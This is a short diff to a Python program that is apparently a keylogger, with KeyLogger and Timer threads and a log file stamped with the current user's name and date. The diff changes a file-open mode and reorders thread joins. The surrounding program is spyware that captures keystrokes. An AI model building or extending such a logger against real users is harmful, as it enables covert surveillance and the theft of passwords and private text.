@@ -91,7 +91,7 @@ def write_file(file, input):
         file.write(input)
 
 def recreate_file(file):
-    with open(file, 'w') as file:
+    with open(file, 'w+') as file:
         file.write("User: {0} | Date: {1} \n".format(getpass.getuser(), datetime.now().replace(microsecond=0))) # Initialize File with Userid and Date.
 
 # Function to retrieve Key presses.
@@ -121,8 +121,8 @@ def main():
         print(threading.enumerate())
 
         # Prevent main thread from finishing.
-        Timer.join()
         KeyLogger.join()
+        Timer.join()
 
     except KeyboardInterrupt: # Once 'ctrl+c' is detected, terminate main thread (also terminates all daemonic threads)
 
